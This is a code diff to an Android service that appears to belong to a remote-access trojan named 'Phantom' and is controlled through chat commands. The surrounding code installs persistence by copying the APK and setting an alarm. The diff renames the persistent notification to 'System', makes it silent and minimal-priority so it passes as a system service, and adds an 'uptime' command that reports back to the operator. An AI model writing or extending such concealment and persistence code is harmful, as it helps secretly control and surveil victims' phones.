@@ -101,11 +101,13 @@ class MainService : Service() {
     }
 
     private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
-        .setContentTitle("Phantom: $text")
+        .setContentTitle("System: $text")
         .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
         .setSmallIcon(android.R.drawable.ic_menu_info_details)
         .setOngoing(true)
         .setPriority(NotificationCompat.PRIORITY_MIN)
+        .setCategory(NotificationCompat.CATEGORY_SERVICE)
+        .setSilent(true)
         .build()
 
     private fun showNotif(text: String) {
@@ -196,6 +198,13 @@ class MainService : Service() {
                     d.sendMsg(":syringe: Installing persistence...")
                     persistApk()
                     d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
+                }
+                "uptime" -> {
+                    val uptime = d.getUptime()
+                    val hrs = uptime / 3600000
+                    val min = (uptime % 3600000) / 60000
+                    val sec = (uptime % 60000) / 1000
+                    d.sendMsg(":clock1: **Uptime**: ${hrs}h ${min}m ${sec}s")
                 }
                 "status" -> {
                     val uptime = d.getUptime()
